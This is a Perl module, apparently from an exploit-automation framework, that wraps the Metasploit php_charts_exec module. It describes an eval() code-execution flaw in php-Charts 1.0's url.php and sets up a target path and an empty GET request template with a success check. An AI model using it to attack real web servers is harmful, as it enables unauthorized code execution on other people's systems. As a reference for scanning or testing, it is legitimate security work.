package MSFExploits::Exploits::PHP::MSF::PhpChartsExec;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::PHP);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "PhpChartsExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits a PHP code execution vulnerability in php-Charts

        version 1.0 which could be abused to allow users to execute arbitrary

        PHP code under the context of the webserver user. The 'url.php' script

        calls eval() with user controlled data from any HTTP GET parameter name.

      ",
  METHOD => "GET",
  MSF_MODULE => "php_charts_exec",
  OSVDB => 89334,
  PATHS => ["php-charts_v1.0/"],
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The path to the web application",
  VALUE => "/php-charts_v1.0/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
